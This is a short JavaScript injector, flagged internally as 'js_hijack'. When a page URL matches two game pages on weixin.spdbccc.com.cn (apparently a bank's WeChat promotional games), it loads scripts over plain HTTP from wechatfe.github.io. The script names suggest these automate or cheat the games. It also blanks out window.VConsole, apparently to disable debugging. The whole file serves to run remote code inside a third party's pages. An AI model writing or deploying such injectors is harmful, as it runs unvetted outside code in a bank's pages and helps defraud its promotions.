(function () {
    if (window.js_hijack === 1) {
        return;
    }
    window.js_hijack = 1;

    function loadScript(src, errorCallback) {
        var tag = document.createElement('script');
        tag.type = 'text/javascript';
        tag.charset = 'utf-8';
        tag.onload = tag.onerror = tag.onreadystatechange = function () {
            if (!this.readyState) {
                errorCallback && errorCallback();
                tag.onerror = tag.onreadystatechange = null;
            }
        };
        tag.src = 'http://wechatfe.github.io/' + src;
        document.getElementsByTagName('head')[0].appendChild(tag);
    }


    var url = location.href;
    if (url.indexOf('weixin.spdbccc.com.cn/wxrp-page-arithmetic/arithmeticGameIndex') > -1) {
        return loadScript('js/pufa_24.js');
    }

    if (url.indexOf('weixin.spdbccc.com.cn/wxrp-page-redpacketsgame/gameIndexjsp') > -1) {
        return loadScript('js/pufa_yishuadaodi.js');
    }
})();

window.VConsole = function () {

};